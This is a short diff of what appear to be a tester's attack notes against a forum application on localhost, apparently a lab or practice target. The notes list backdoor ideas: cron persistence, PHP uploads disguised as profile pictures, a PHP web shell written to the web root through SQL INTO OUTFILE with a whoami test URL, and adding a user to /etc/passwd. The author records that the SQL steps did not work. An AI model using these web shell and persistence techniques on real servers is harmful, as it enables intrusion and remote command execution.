@@ -39,10 +39,11 @@ https://localhost:13443/forum/index.php?mode=admin&action=edit_page PHP backdoor
 Add backdoor to cron
 Try uploading php files instead of profile pictures for backdoor
 
-Insert backdoor.php using SQL
+Insert backdoor.php using SQL (these commands don't work)
 SELECT '<?php phpinfo(); ?>' INTO OUTFILE '/tmp/mycustomphpinfo.php'
 SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/backdoor.php'
-https://localhost:1443/backdoor.php?cmd=whoami
+https://localhost:13443/backdoor.php?cmd=whoami
+Maybe here? https://localhost:13443/forum/images/uploaded/ (doesn't seem to work either)
 Add a user to /etc/passwd using SQL
 
 PASSWORDS
